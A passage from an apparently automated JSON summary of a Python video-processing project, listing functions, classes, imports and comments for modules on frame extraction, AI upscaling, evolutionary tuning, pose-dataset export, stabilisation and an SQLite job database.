          "def extract_audio(video_path: str, output_path: str, sample_rate: int = 16000) -> bool:\n\"\"\"\nExtract audio from video as WAV file (required format for whisper.cpp).\n\nArgs:\nvideo_path: Input video path\noutput_path: Output WAV path\nsample_rate: Audio sample rate (16kHz for Whisper)\n\nReturns:",
          "def compute_blur_score(frame: np.ndarray) -> float:\n\"\"\"\nCompute blur score using Laplacian variance.\nLower score = more blurry.\n\"\"\"",
          "def compute_shake_score(flow: np.ndarray) -> float:\n\"\"\"\nCompute camera shake score from optical flow.\nHigher score = more shake.\n\"\"\"",
          "def resize_frame(frame: np.ndarray, max_dimension: int = 640) -> np.ndarray:\n\"\"\"Resize frame while maintaining aspect ratio.\"\"\"\nh, w = frame.shape[:2]\nif max(h, w) <= max_dimension:\nreturn frame\n\nif w > h:\nnew_w = max_dimension\nnew_h = int(h * max_dimension / w)\nelse:",
          "def __init__(self, video_path: str):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_val, exc_tb):",
          "def fps(self) -> float:",
          "def total_frames(self) -> int:",
          "def duration_ms(self) -> int:",
          "def read_frame(self, frame_number: int) -> Optional[np.ndarray]:\n\"\"\"Read a specific frame by number.\"\"\"\nself.cap.set(cv2.CAP_PROP_POS_FRAMES, frame_number)\nret, frame = self.cap.read()\nreturn frame if ret else None\n\ndef frames(self, target_fps: float = 1.0) -> Generator[Tuple[int, int, np.ndarray], None, None]:\n\"\"\"Iterate over frames at target FPS.\"\"\"",
          "def frames(self, target_fps: float = 1.0) -> Generator[Tuple[int, int, np.ndarray], None, None]:\n\"\"\"Iterate over frames at target FPS.\"\"\"\nyield from extract_frames_generator(self.video_path, target_fps)\n\n\nif __name__ == \"__main__\":\nimport sys\n\nif len(sys.argv) < 2:\nprint(\"Usage: python video_utils.py <video_path>\")"
        ],
        "class_defs": [
          "class VideoReader:"
        ],
        "imports": [
          "import subprocess",
          "import json",
          "from pathlib import Path",
          "from typing import Dict, List, Generator, Optional, Tuple",
          "import cv2",
          "import numpy as np",
          "from tqdm import tqdm",
          "import sys"
        ],
        "comments": [
          "# Get format info",
          "# Find video stream",
          "# Parse frame rate (can be \"30/1\" or \"29.97\")",
          "# Calculate total frames",
          "# Calculate frame skip interval",
          "# Set start position",
          "# Only yield frames at target interval",
          "# Get metadata first",
          "# Use FFmpeg for extraction",
          "# List extracted frames"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": [
          "@property",
          "@property",
          "@property"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/models.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, channels: int, use_bn: bool = False):",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def __init__(",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def __init__(",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def _apply_adjustments(self, x: torch.Tensor) -> torch.Tensor:\n\"\"\"Apply hyperparameter-based adjustments.\"\"\"\n# Brightness\nx = x * self.hyperparameters['brightness']\n\n# Contrast\nmean = x.mean(dim=(2, 3), keepdim=True)\nx = (x - mean) * self.hyperparameters['contrast'] + mean\n\n# Saturation (in RGB space approximation)",
          "def get_hyperparameters(self) -> Dict[str, float]:\n\"\"\"Get current hyperparameters.\"\"\"\nreturn self.hyperparameters.copy()\n\ndef set_hyperparameters(self, params: Dict[str, float]):\n\"\"\"Set hyperparameters.\"\"\"",
          "def set_hyperparameters(self, params: Dict[str, float]):\n\"\"\"Set hyperparameters.\"\"\"\nfor key, value in params.items():\nif key in self.hyperparameters:\nself.hyperparameters[key] = value\n\n\nclass DenoiseNet(nn.Module):\n\"\"\"",
          "def __init__(self, channels: int = 32, num_layers: int = 5):",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def __init__(self, channels: int = 32):",
          "def forward(",
          "def __init__(self, models: list, weights: Optional[list] = None):",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def create_lightweight_model(",
          "def create_evolutionary_model("
        ],
        "class_defs": [
          "class ResBlock(nn.Module):",
          "class LightweightSR(nn.Module):",
          "class EvolutionaryEnhancer(nn.Module):",
          "class DenoiseNet(nn.Module):",
          "class TemporalConsistencyNet(nn.Module):",
          "class ModelEnsemble(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "from typing import Dict, Any, Optional",
          "from dataclasses import dataclass, field"
        ],
        "comments": [
          "# Initial feature extraction",
          "# Residual blocks",
          "# Upsampling layers",
          "# Calculate number of 2x upsamples needed",
          "# Final convolution",
          "# Initial feature extraction",
          "# Residual blocks",
          "# Global skip connection",
          "# Upsampling",
          "# Final convolution",
          "# Smooth clamping for natural transitions",
          "# Evolvable hyperparameters",
          "# Initial convolution",
          "# Detail extraction branch",
          "# Texture branch",
          "# Main processing blocks",
          "# Feature fusion",
          "# Upsampling",
          "# Final output",
          "# Sharpening kernel (learnable)",
          "# Initial features",
          "# Multi-branch processing",
          "# Weighted fusion using hyperparameters",
          "# Upsampling",
          "# Final output",
          "# Apply hyperparameter adjustments",
          "# Brightness",
          "# Contrast",
          "# Saturation (in RGB space approximation)",
          "# Sharpening",
          "# Residual learning - predict noise",
          "# Feature extraction for both frames",
          "# Temporal fusion",
          "# Output",
          "# Extract features",
          "# Fuse temporal information",
          "# Generate output",
          "# Blend with current frame",
          "# Test models",
          "# Test LightweightSR",
          "# Test EvolutionaryEnhancer",
          "# Test DenoiseNet",
          "# Test TemporalConsistencyNet"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/enhance_engine.py",
        "docstrings": [],
        "function_defs": [
          "def from_profile(cls, profile: EnhancementProfile) -> 'EnhancementConfig':\n\"\"\"Create config from a preset profile\"\"\"\nprofiles = {\nEnhancementProfile.PROTEUS: cls(\nupscale=True, upscale_factor=4, denoise=True, denoise_strength=0.5,\nsharpen=True, sharpen_strength=0.3, face_enhance=True,\ntemporal_consistency=True, stabilize=True\n),\nEnhancementProfile.ARTEMIS: cls(\nupscale=True, upscale_factor=4, denoise=True, denoise_strength=0.3,",
          "def __init__(",
          "def _get_device(self) -> str:\n\"\"\"Determine best available device\"\"\"\nif torch.backends.mps.is_available():\nreturn \"mps\"  # Apple Silicon\nelif torch.cuda.is_available():\nreturn \"cuda\"\nreturn \"cpu\"\n\n@property\ndef upscaler(self):",
          "def upscaler(self):\n\"\"\"Lazy load upscaler\"\"\"\nif self._upscaler is None:\nself._upscaler = self._load_upscaler()\nreturn self._upscaler\n\ndef _load_upscaler(self, model_name: str = \"realesrgan\"):\n\"\"\"Load Real-ESRGAN upscaler using spandrel with M2 optimization\"\"\"",
          "def _load_upscaler(self, model_name: str = \"realesrgan\"):\n\"\"\"Load Real-ESRGAN upscaler using spandrel with M2 optimization\"\"\"\ntry:\nimport spandrel\n\nif model_name == \"realesrgan-anime\":\nmodel_path = self.models_dir / 'upscale' / 'RealESRGAN_x4plus_anime_6B.pth'\nelse:\nmodel_path = self.models_dir / 'upscale' / 'RealESRGAN_x4plus.pth'\n",
          "def _load_face_enhancer(self):\n\"\"\"Load CodeFormer face enhancer\"\"\"\n# CodeFormer requires more setup - placeholder for now\nreturn None\n\ndef _load_interpolator(self):\n\"\"\"Load RIFE frame interpolator\"\"\"",
          "def _load_interpolator(self):\n\"\"\"Load RIFE frame interpolator\"\"\"\ntry:\nfrom model.RIFE import Model as RIFEModel\n\nmodel = RIFEModel()\nmodel.load_model(str(self.models_dir / 'RIFE' / 'train_log'), -1)\nmodel.eval()\nmodel.device()\n",
          "def get_video_info(self, video_path: str) -> Dict[str, Any]:\n\"\"\"Get video metadata using ffprobe\"\"\"\ncmd = [\n'ffprobe', '-v', 'quiet',\n'-print_format', 'json',\n'-show_format', '-show_streams',\nstr(video_path)\n]\nresult = subprocess.run(cmd, capture_output=True, text=True)\ndata = json.loads(result.stdout)",
          "def upscale_frame(self, frame: np.ndarray, scale: int = 4) -> np.ndarray:\n\"\"\"Upscale a single frame using Real-ESRGAN with M2 optimization\"\"\"\nimport time\nstart_time = time.time()\n\nif self.upscaler is None:\n# Fallback to bicubic\nh, w = frame.shape[:2]\nreturn cv2.resize(frame, (w * scale, h * scale), interpolation=cv2.INTER_CUBIC)\n",
          "def _upscale_direct(self, img: np.ndarray) -> np.ndarray:\n\"\"\"Direct upscaling without tiling (for small frames)\"\"\"\n# Normalize to 0-1 and convert to tensor\nimg = img.astype(np.float32) / 255.0\nimg_tensor = torch.from_numpy(img).permute(2, 0, 1).unsqueeze(0)\nimg_tensor = img_tensor.to(self.device)\n\n# Upscale\nwith torch.no_grad():\noutput = self.upscaler(img_tensor)",
          "def get_performance_stats(self) -> Dict[str, Any]:\n\"\"\"Get performance statistics\"\"\"\nstats = {\n'frames_processed': self._frames_processed,\n'total_upscale_time': self._total_upscale_time,\n'avg_time_per_frame': self._total_upscale_time / max(self._frames_processed, 1),\n'device': self.device,\n'm2_acceleration': self.use_m2_acceleration\n}\n",
          "def denoise_frame(self, frame: np.ndarray, strength: float = 0.5) -> np.ndarray:\n\"\"\"Denoise frame using bilateral filter + optional NLM\"\"\"\n# Bilateral filter (fast, edge-preserving)\nd = int(9 * strength) or 5\nsigma_color = int(75 * strength) or 30\nsigma_space = int(75 * strength) or 30\n\ndenoised = cv2.bilateralFilter(frame, d, sigma_color, sigma_space)\n\n# For stronger denoising, add non-local means",
          "def sharpen_frame(self, frame: np.ndarray, strength: float = 0.3) -> np.ndarray:\n\"\"\"Sharpen frame using unsharp mask\"\"\"\n# Create Gaussian blur\nblurred = cv2.GaussianBlur(frame, (0, 0), 3)\n\n# Unsharp mask\nsharpened = cv2.addWeighted(frame, 1.0 + strength, blurred, -strength, 0)\n\nreturn sharpened\n",
          "def enhance_frame(self, frame: np.ndarray, config: EnhancementConfig) -> np.ndarray:\n\"\"\"Apply full enhancement pipeline to a single frame\"\"\"\nresult = frame.copy()\n\n# Denoise first (before upscaling)\nif config.denoise:\nresult = self.denoise_frame(result, config.denoise_strength)\n\n# Upscale\nif config.upscale:",
          "def enhance_video(",
          "def _extract_frames(self, video_path: str, output_dir: str):\n\"\"\"Extract frames from video using ffmpeg\"\"\"\ncmd = [\n'ffmpeg', '-i', video_path,\n'-qscale:v', '1',  # Best quality\n'-start_number', '0',\nf'{output_dir}/frame_%06d.png',\n'-y', '-hide_banner', '-loglevel', 'error'\n]\nsubprocess.run(cmd, check=True)",
          "def _interpolate_frames(",
          "def _interpolate_pair(",
          "def _reconstruct_video(",
          "def enhance_video_cli():\n\"\"\"Command-line interface for video enhancement\"\"\"\nimport argparse\n\nparser = argparse.ArgumentParser(\ndescription='Enhance video quality using AI (Topaz Video AI alternative)'\n)\nparser.add_argument('input', help='Input video file')\nparser.add_argument('-o', '--output', help='Output video file')\nparser.add_argument("
        ],
        "class_defs": [
          "class EnhancementProfile(Enum):",
          "class EnhancementConfig:",
          "class VideoEnhancer:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import tempfile",
          "import subprocess",
          "from pathlib import Path",
          "from dataclasses import dataclass",
          "from typing import Optional, List, Tuple, Dict, Any",
          "from enum import Enum",
          "import shutil",
          "import logging",
          "import cv2",
          "import numpy as np",
          "import torch",
          "from tqdm import tqdm",
          "from .m2_acceleration import M2Accelerator, MemoryManager, get_accelerator",
          "from m2_acceleration import M2Accelerator, MemoryManager, get_accelerator",
          "from .checkpointing import CheckpointManager, RecoveryManager, get_checkpoint_manager",
          "from checkpointing import CheckpointManager, RecoveryManager, get_checkpoint_manager",
          "import spandrel",
          "import traceback",
          "from model.RIFE import Model as RIFEModel",
          "import time",
          "import dataclasses",
          "import argparse"
        ],
        "comments": [
          "# Local imports - handle both package and direct execution",
          "# Add RIFE to path",
          "# Upscaling",
          "# Denoising",
          "# Sharpening",
          "# Face enhancement",
          "# Frame interpolation",
          "# Stabilization",
          "# Temporal consistency",
          "# Output",
          "# M2 Acceleration",
          "# Model instances (lazy loaded)",
          "# Stats",
          "# Checkpointing",
          "# Apply M2 optimization if available",
          "# CodeFormer requires more setup - placeholder for now",
          "# Fallback to bicubic",
          "# Convert BGR to RGB",
          "# Use tiled processing for large frames with M2 acceleration",
          "# Determine optimal tile size based on frame size",
          "# Use tiled processing for frames larger than tile size",
          "# Small enough for direct processing",
          "# Convert back to BGR",
          "# Update stats",
          "# Periodic memory cleanup",
          "# Normalize to 0-1 and convert to tensor",
          "# Upscale",
          "# Convert back",
          "# Bilateral filter (fast, edge-preserving)",
          "# For stronger denoising, add non-local means",
          "# Create Gaussian blur",
          "# Unsharp mask",
          "# Denoise first (before upscaling)",
          "# Upscale",
          "# Sharpen (after upscaling)",
          "# Use profile or config",
          "# Get video info",
          "# Calculate output dimensions",
          "# Check for resumable job",
          "# Resume from last checkpoint",
          "# Create checkpoint job",
          "# Extract frames",
          "# Get frame list",
          "# Update checkpoint with total frames",
          "# Process frames",
          "# Skip already processed frames when resuming",
          "# Read frame",
          "# Enhance",
          "# Temporal consistency (simple blend with previous)",
          "# Blend with previous frame to reduce flicker",
          "# Update checkpoint periodically",
          "# Save enhanced frame",
          "# Frame interpolation (if enabled)",
          "# Reconstruct video",
          "# Mark checkpoint complete",
          "# Print performance stats",
          "# Calculate multiplier",
          "# Just copy frames",
          "# Save original frame",
          "# Generate intermediate frames",
          "# Simple optical flow interpolation",
          "# Save last frame",
          "# Compute optical flow",
          "# Warp frame1 toward frame2",
          "# Blend",
          "# Create video from frames",
          "# Add original audio",
          "# Cleanup",
          "# Determine output path",
          "# Create config from profile",
          "# Apply CLI overrides",
          "# Run enhancement"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 14,
        "decorators": [
          "@dataclass",
          "@classmethod",
          "@property"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/evolutionary_optimizer.py",
        "docstrings": [],
        "function_defs": [
          "def to_dict(self) -> Dict:",
          "def from_dict(cls, data: Dict) -> 'EvolutionaryConfig':",
          "def copy(self) -> 'EvolutionaryConfig':",
          "def __init__(self):",
          "def evaluate_frame(",
          "def _measure_sharpness(self, img: np.ndarray) -> float:\n\"\"\"Measure sharpness using Laplacian variance\"\"\"\ngray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) if len(img.shape) == 3 else img\nlaplacian = cv2.Laplacian(gray, cv2.CV_64F)\nreturn laplacian.var()\n\ndef _estimate_noise(self, img: np.ndarray) -> float:\n\"\"\"Estimate noise level using median absolute deviation\"\"\"",
          "def _estimate_noise(self, img: np.ndarray) -> float:\n\"\"\"Estimate noise level using median absolute deviation\"\"\"\ngray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) if len(img.shape) == 3 else img\n\n# High-pass filter\nkernel = np.array([[-1, -1, -1],\n[-1,  8, -1],\n[-1, -1, -1]]) / 8.0\n\nhigh_pass = cv2.filter2D(gray.astype(np.float32), -1, kernel)",
          "def _compare_color_distribution(",
          "def _measure_detail_preservation(",
          "def _detect_artifacts(self, img: np.ndarray) -> float:\n\"\"\"Detect common enhancement artifacts (0 = no artifacts, 1 = severe)\"\"\"\ngray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n# Detect blocking artifacts (from compression or tiling)\nblock_score = self._detect_blocking(gray)\n\n# Detect ringing/halo artifacts\nringing_score = self._detect_ringing(gray)\n",
          "def _detect_blocking(self, gray: np.ndarray) -> float:\n\"\"\"Detect blocking artifacts\"\"\"\n# Look for regular patterns at 8x8 or 16x16 block boundaries\nh, w = gray.shape\n\n# Sample block boundaries\nblock_diffs = []\nfor block_size in [8, 16]:\nfor i in range(block_size, h - block_size, block_size):\nrow_above = gray[i-1, :].astype(float)",
          "def _detect_ringing(self, gray: np.ndarray) -> float:\n\"\"\"Detect ringing/halo artifacts around edges\"\"\"\n# Find edges\nedges = cv2.Canny(gray, 50, 150)\n\n# Dilate edges to get neighborhood\nkernel = np.ones((5, 5), np.uint8)\nedge_region = cv2.dilate(edges, kernel, iterations=2)\n\n# Look for oscillations in edge neighborhoods",
          "def _get_scene_weights(self, scene_type: SceneType) -> Dict[str, float]:\n\"\"\"Get evaluation weights based on scene type\"\"\"\nbase_weights = self.weights.copy()\n\nif scene_type == SceneType.CLOSEUP:\n# Prioritize detail and artifacts for faces\nbase_weights['detail'] = 0.30\nbase_weights['artifacts'] = 0.25\nbase_weights['sharpness'] = 0.20\n",
          "def __init__(",
          "def _init_storage(self):\n\"\"\"Initialize storage directories\"\"\"\n(self.storage_path / \"evolution_history\").mkdir(parents=True, exist_ok=True)\n(self.storage_path / \"best_configs\").mkdir(parents=True, exist_ok=True)\n\ndef optimize(\nself,\nsample_frames: List[Tuple[np.ndarray, np.ndarray]],  # (original, enhanced) pairs\nscene_type: SceneType,\nenhance_func: Callable[[np.ndarray, EvolutionaryConfig], np.ndarray],",
          "def optimize(",
          "def _initialize_population(",
          "def _evaluate_config(",
          "def _evolve(self, population: List[EvolutionaryConfig]) -> List[EvolutionaryConfig]:\n\"\"\"Create next generation through selection, crossover, and mutation\"\"\"\n# Elitism: keep top 20%\nelite_size = max(2, len(population) // 5)\nnew_population = [p.copy() for p in population[:elite_size]]\n\n# Fill rest with offspring\nwhile len(new_population) < self.population_size:\n# Tournament selection\nparent1 = self._tournament_select(population)",
          "def _tournament_select(",
          "def _crossover(",
          "def _mutate(",
          "def _save_result(self, result: OptimizationResult, scene_type: SceneType):\n\"\"\"Save optimization result to disk\"\"\"\ntimestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n\n# Save to history\nhistory_file = self.storage_path / \"evolution_history\" / f\"{scene_type.value}_{timestamp}.json\"\nwith open(history_file, 'w') as f:\njson.dump({\n'scene_type': scene_type.value,\n'timestamp': timestamp,",
          "def _load_best_config(self, scene_type: SceneType) -> Optional[EvolutionaryConfig]:\n\"\"\"Load best known configuration for scene type\"\"\"\nbest_file = self.storage_path / \"best_configs\" / f\"{scene_type.value}.json\"\n\nif best_file.exists():\nwith open(best_file) as f:\ndata = json.load(f)\nreturn EvolutionaryConfig.from_dict(data['config'])\n\nreturn None",
          "def get_best_config(self, scene_type: SceneType) -> EvolutionaryConfig:\n\"\"\"Get best configuration for scene type (or default if none learned)\"\"\"\nlearned = self._load_best_config(scene_type)\nif learned:\nreturn learned\n\nif scene_type in self.presets:\nreturn self.presets[scene_type].copy()\n\nreturn EvolutionaryConfig()",
          "def enhance_with_config(img, config):\n\"\"\"Apply enhancement with evolutionary config\"\"\"\nec = EnhancementConfig(\ndenoise=True,\ndenoise_strength=config.denoise_strength,\nsharpen=True,\nsharpen_strength=config.sharpen_strength,\nupscale=True,\nupscale_factor=config.upscale_factor\n)"
        ],
        "class_defs": [
          "class EvolutionaryConfig:",
          "class OptimizationResult:",
          "class QualityEvaluator:",
          "class EvolutionaryOptimizer:"
        ],
        "imports": [
          "import json",
          "import logging",
          "from pathlib import Path",
          "from dataclasses import dataclass, field",
          "from typing import Dict, List, Optional, Tuple, Callable",
          "from datetime import datetime",
          "import random",
          "import numpy as np",
          "import cv2",
          "from scene_detection import SceneType, SceneInfo",
          "import sys",
          "from enhance_engine import VideoEnhancer, EnhancementConfig"
        ],
        "comments": [
          "# Core parameters to optimize",
          "# Fixed parameters",
          "# Fitness score (set by evaluator)",
          "# Resize original for comparison if needed",
          "# Sharpness improvement",
          "# Want improvement but not over-sharpening",
          "# Optimal ratio depends on upscale factor",
          "# Noise level (lower is better for enhanced)",
          "# Color preservation",
          "# Detail preservation",
          "# Artifact detection",
          "# Adjust weights based on scene type",
          "# Calculate weighted average",
          "# High-pass filter",
          "# Correlation comparison (1.0 = identical)",
          "# Use edge detection to compare structure",
          "# Normalize edge counts",
          "# Enhanced should preserve or slightly increase edge content",
          "# Optimal ratio is slightly above 1.0 (more detail)",
          "# Detect blocking artifacts (from compression or tiling)",
          "# Detect ringing/halo artifacts",
          "# Look for regular patterns at 8x8 or 16x16 block boundaries",
          "# Sample block boundaries",
          "# Compare block boundary differences to random row differences",
          "# If block boundaries have higher differences, there's blocking",
          "# Find edges",
          "# Dilate edges to get neighborhood",
          "# Look for oscillations in edge neighborhoods",
          "# High laplacian variance in edge regions indicates ringing",
          "# Normalize by overall variance",
          "# High ratio indicates ringing",
          "# Prioritize detail and artifacts for faces",
          "# Animation needs clean colors and edges",
          "# Action scenes - less strict on detail",
          "# Low light - prioritize noise reduction",
          "# Normalize weights",
          "# Parameter ranges for mutation",
          "# Scene-type specific presets (starting points)",
          "# Initialize population",
          "# Evaluate population",
          "# Sort by fitness",
          "# Track best",
          "# Early stopping",
          "# Create next generation",
          "# Save results",
          "# Add initial config if provided",
          "# Add scene-specific preset",
          "# Add default preset",
          "# Load best known config for this scene type",
          "# Fill rest with random variations",
          "# Apply enhancement with this config",
          "# Evaluate quality",
          "# Elitism: keep top 20%",
          "# Fill rest with offspring",
          "# Tournament selection",
          "# Crossover",
          "# Mutation",
          "# Save to history",
          "# Update best config if better than known best",
          "# Test the optimizer",
          "# Initialize",
          "# Test with a sample frame",
          "# Run optimization"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@dataclass",
          "@classmethod",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/dataset_export.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, output_dir: str):\n\"\"\"\nInitialize exporter.\n\nArgs:\noutput_dir: Output directory for dataset\n\"\"\"",
          "def export(",
          "def _convert_keypoints(self, keypoints: List[Dict]) -> Tuple[List[float], int]:\n\"\"\"\nConvert MediaPipe keypoints to COCO format.\n\nReturns:\nTuple of (flattened keypoint list, num visible keypoints)\n\"\"\"",
          "def _calculate_bbox(self, keypoints: List[Dict]) -> List[float]:\n\"\"\"Calculate bounding box from keypoints.\"\"\"\nvisible = [(kp['x'], kp['y']) for kp in keypoints if kp.get('visibility', 0) > 0.3]\n\nif not visible:\nreturn [0, 0, 0, 0]\n\nxs, ys = zip(*visible)\nx_min, x_max = min(xs), max(xs)\ny_min, y_max = min(ys), max(ys)",
          "def __init__(self, output_dir: str):",
          "def export(self, data_dir: str) -> Dict:\n\"\"\"\nExport all processed data to unified JSON.\n\nArgs:\ndata_dir: Base data directory\n\nReturns:\nExport statistics\n\"\"\"",
          "def __init__(self, output_dir: str):",
          "def export(self, data_dir: str) -> Dict:\n\"\"\"\nExport pose data to Parquet tables.\n\nArgs:\ndata_dir: Base data directory\n\nReturns:\nExport statistics\n\"\"\"",
          "def __init__(self, data_dir: str):",
          "def generate_report(self) -> Dict:\n\"\"\"\nGenerate comprehensive dataset statistics.\n\nReturns:\nStatistics dictionary\n\"\"\"",
          "def save_report(self, output_file: str = None) -> str:\n\"\"\"\nGenerate and save statistics report.\n\nArgs:\noutput_file: Output file path (default: data_dir/dataset_stats.json)\n\nReturns:\nPath to saved report\n\"\"\"",
          "def print_summary(self):\n\"\"\"Print a human-readable summary.\"\"\"\nstats = self.generate_report()\n\nprint(\"\\n\" + \"=\"*60)\nprint(\"DATASET STATISTICS\")\nprint(\"=\"*60)\n\nprint(f\"\\nVideos processed: {stats['totals']['num_videos']}\")\nprint(f\"Total frames: {stats['totals']['total_frames']}\")",
          "def export_dataset("
        ],
        "class_defs": [
          "class DatasetInfo:",
          "class COCOExporter:",
          "class JSONExporter:",
          "class ParquetExporter:",
          "class DatasetStats:"
        ],
        "imports": [
          "import json",
          "import shutil",
          "from pathlib import Path",
          "from typing import Dict, List, Optional, Tuple",
          "from datetime import datetime",
          "from dataclasses import dataclass, asdict",
          "import numpy as np",
          "from tqdm import tqdm",
          "from . import database as db",
          "import pandas as pd",
          "import sys"
        ],
        "comments": [
          "# COCO Keypoint format (17 keypoints)",
          "# COCO skeleton connections",
          "# MediaPipe to COCO keypoint mapping",
          "# Collect all video outputs",
          "# Use tracking data if available for person IDs",
          "# Create image entry",
          "# Convert keypoints to COCO format",
          "# Calculate bounding box",
          "# Get person ID from tracking if available",
          "# Find matching frame in tracking data",
          "# Split into train/val/test",
          "# Create COCO format for each split",
          "# Initialize with zeros (17 keypoints * 3 values each)",
          "# COCO visibility: 0=not labeled, 1=labeled but not visible, 2=labeled and visible",
          "# Add padding",
          "# Load each data type if available",
          "# Load transcript",
          "# Write unified dataset",
          "# Collect all pose data into flat tables",
          "# Process poses",
          "# Flatten keypoints",
          "# Process transcripts",
          "# Create DataFrames and save",
          "# Check poses",
          "# Check other files",
          "# Calculate averages"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 6,
        "error_handling": 4,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/stabilization.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def estimate_transforms(self, video_path: str) -> List[np.ndarray]:\n\"\"\"\nEstimate frame-to-frame transforms.\n\nArgs:\nvideo_path: Path to video\n\nReturns:\nList of 2x3 affine transform matrices\n\"\"\"",
          "def compute_trajectory(self, transforms: List[np.ndarray]) -> np.ndarray:\n\"\"\"\nCompute cumulative camera trajectory from transforms.\n\nArgs:\ntransforms: List of frame-to-frame transforms\n\nReturns:\nNx3 array of (x, y, rotation) trajectory\n\"\"\"",
          "def smooth_trajectory(self, trajectory: np.ndarray) -> np.ndarray:\n\"\"\"\nSmooth trajectory using moving average.\n\nArgs:\ntrajectory: Nx3 trajectory array\n\nReturns:\nSmoothed trajectory\n\"\"\"",
          "def compute_correction_transforms(",
          "def stabilize(",
          "def stabilize_video(",
          "def analyze_shakiness(video_path: str, sample_fps: float = 5.0) -> Dict:\n\"\"\"\nAnalyze video shakiness without stabilizing.\n\nArgs:\nvideo_path: Path to video\nsample_fps: FPS for analysis (lower = faster)\n\nReturns:\nShakiness analysis results"
        ],
        "class_defs": [
          "class StabilizationResult:",
          "class VideoStabilizer:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from typing import List, Dict, Optional, Tuple",
          "from dataclasses import dataclass",
          "from pathlib import Path",
          "from tqdm import tqdm",
          "import json",
          "from .video_utils import VideoReader",
          "import sys"
        ],
        "comments": [
          "# Initialize ORB detector",
          "# Match features",
          "# Extract matched points",
          "# Estimate affine transform",
          "# Extract translation",
          "# Extract rotation",
          "# Moving average filter",
          "# Pad to handle edges",
          "# Difference between smoothed and original = correction needed",
          "# Build correction transform",
          "# Step 1: Estimate transforms",
          "# Step 2: Compute trajectory",
          "# Step 3: Smooth trajectory",
          "# Step 4: Compute corrections",
          "# Step 5: Apply corrections and write output",
          "# Cropped dimensions",
          "# Apply correction transform",
          "# Crop to remove borders",
          "# Track correction magnitude",
          "# Shakiness score (0-100)",
          "# Based on typical camera motion thresholds"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 6,
        "error_handling": 1,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/database.py",
        "docstrings": [],
        "function_defs": [
          "def get_db_path() -> Path:\n\"\"\"Get the database path.\"\"\"\nreturn Path(__file__).parent.parent / \"data\" / \"pipeline.db\"\n\n\ndef get_connection() -> sqlite3.Connection:\n\"\"\"Get a database connection with row factory.\"\"\"",
          "def get_connection() -> sqlite3.Connection:\n\"\"\"Get a database connection with row factory.\"\"\"\nconn = sqlite3.connect(get_db_path())\nconn.row_factory = sqlite3.Row\nreturn conn\n\n\ndef init_database():\n\"\"\"Initialize the database schema.\"\"\"",
          "def init_database():\n\"\"\"Initialize the database schema.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\n# Videos table - stores metadata about input videos\ncursor.execute(\"\"\"",
          "def compute_file_hash(filepath: Path, chunk_size: int = 8192) -> str:\n\"\"\"Compute SHA256 hash of a file (first 10MB for speed).\"\"\"\nhasher = hashlib.sha256()\nmax_bytes = 10 * 1024 * 1024  # 10MB\nbytes_read = 0\n\nwith open(filepath, 'rb') as f:\nwhile bytes_read < max_bytes:\nchunk = f.read(chunk_size)\nif not chunk:",
          "def add_video(path: str, metadata: Dict[str, Any]) -> int:\n\"\"\"Add a video to the database. Returns video ID.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\nfilepath = Path(path)\nfile_hash = compute_file_hash(filepath)\n\ncursor.execute(\"\"\"",
          "def get_video(video_id: int) -> Optional[Dict]:\n\"\"\"Get video by ID.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\"SELECT * FROM videos WHERE id = ?\", (video_id,))\nrow = cursor.fetchone()\nconn.close()\nreturn dict(row) if row else None\n\n",
          "def get_pending_videos() -> List[Dict]:\n\"\"\"Get all videos pending processing.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\"SELECT * FROM videos WHERE status = 'pending' ORDER BY created_at\")\nrows = cursor.fetchall()\nconn.close()\nreturn [dict(row) for row in rows]\n\n",
          "def update_video_status(video_id: int, status: str):\n\"\"\"Update video processing status.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"UPDATE videos SET status = ?, updated_at = ? WHERE id = ?\",\n(status, datetime.now().isoformat(), video_id)\n)\nconn.commit()\nconn.close()",
          "def create_job(video_id: int, job_type: str) -> int:\n\"\"\"Create a processing job. Returns job ID.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"INSERT INTO jobs (video_id, job_type, status) VALUES (?, ?, 'pending')\",\n(video_id, job_type)\n)\njob_id = cursor.lastrowid\nconn.commit()",
